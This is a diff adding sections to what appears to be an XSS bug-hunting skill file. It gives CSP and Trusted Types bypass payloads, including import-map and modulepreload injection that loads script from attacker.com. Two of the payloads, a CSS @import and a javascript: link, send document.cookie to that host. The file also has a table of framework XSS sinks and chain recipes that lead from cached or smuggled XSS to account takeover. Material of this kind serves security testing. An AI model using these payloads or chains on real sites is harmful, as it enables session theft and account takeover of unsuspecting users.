@@ -427,6 +427,38 @@ Cross-references:
 
 ## Related Skills & Chains
 
+### Phase X — CSP Bypass via Import Maps & Modulepreload
+
+```html
+<!-- Import map injection to redirect script loads -->
+<script>
+document.head.innerHTML += '<script type="importmap">{"imports":{"app":"https://attacker.com/evil.js"}}</script>';
+</script>
+
+<!-- Module preload poisoning -->
+<link rel="modulepreload" href="https://attacker.com/evil.js" as="script">
+```
+
+### Phase Y — Trusted Types Bypass Vectors
+
+```javascript
+// Bypass via CSS injection leading to script execution
+<style>@import url('https://attacker.com/exfil?'+document.cookie);</style>
+
+// Bypass via URL handler pivots
+<a href="javascript:fetch('https://attacker.com?'+document.cookie)">click</a>
+```
+
+### Phase Z — Framework-Specific Sinks
+
+| Framework | Unsafe Pattern |
+|---|---|
+| React | `dangerouslySetInnerHTML={{__html: userInput}}` |
+| Vue | `v-html="userInput"` |
+| Angular | `[innerHTML]="userInput"` / `bypassSecurityTrustHtml()` |
+| Svelte | `{@html userInput}` |
+| jQuery | `$("#el").html(userInput)` / `.append(userInput)` |
+
 - **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
 - **`hunt-csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
 - **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
